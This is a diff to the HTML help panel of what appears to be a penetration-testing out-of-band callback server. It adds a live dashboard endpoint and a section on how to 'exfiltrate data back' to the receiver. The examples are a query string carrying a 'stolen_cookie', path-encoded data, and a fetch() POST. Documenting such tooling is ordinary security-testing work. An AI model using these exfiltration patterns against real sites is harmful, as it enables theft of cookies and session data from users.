@@ -444,9 +444,42 @@
                                 <td><span class="info-url" data-oob-path="/{key}/{token}">{base}/{key}/{token}</span></td>
                                 <td>Catch-all callback receiver &mdash; payloads hit this</td>
                             </tr>
+                            <tr>
+                                <td><span class="info-method method-GET">GET</span></td>
+                                <td><span class="info-url" data-oob-path="/api/live">/api/live</span></td>
+                                <td>Live callback dashboard (open in browser)</td>
+                            </tr>
                         </tbody>
                     </table>
                     <p class="info-hint">URLs use the OOB server configured in Settings. Click a URL to open it, or right-click to copy.</p>
+                </div>
+
+                <div class="info-section">
+                    <div class="info-section-title">Passing Data to OOB Server</div>
+                    <p class="info-desc">The catch-all receiver captures everything. Use these methods to exfiltrate data back:</p>
+                    <table class="info-endpoint-table">
+                        <thead>
+                            <tr><th>Method</th><th>Example</th><th>Where it appears</th></tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td><span class="info-method" style="background:var(--surface2);color:var(--text-dim)">Query</span></td>
+                                <td><code>/{key}/{token}?d=stolen_cookie&amp;page=admin</code></td>
+                                <td>query_params</td>
+                            </tr>
+                            <tr>
+                                <td><span class="info-method" style="background:var(--surface2);color:var(--text-dim)">Path</span></td>
+                                <td><code>/{key}/{token}/extra/path/data</code></td>
+                                <td>extra_path</td>
+                            </tr>
+                            <tr>
+                                <td><span class="info-method method-POST">POST</span></td>
+                                <td><code>fetch(url, {method:'POST', body: data})</code></td>
+                                <td>body</td>
+                            </tr>
+                        </tbody>
+                    </table>
+                    <p class="info-hint">All methods also capture request headers, source IP, HTTP method, and timestamp.</p>
                 </div>
 
                 <div class="info-section">
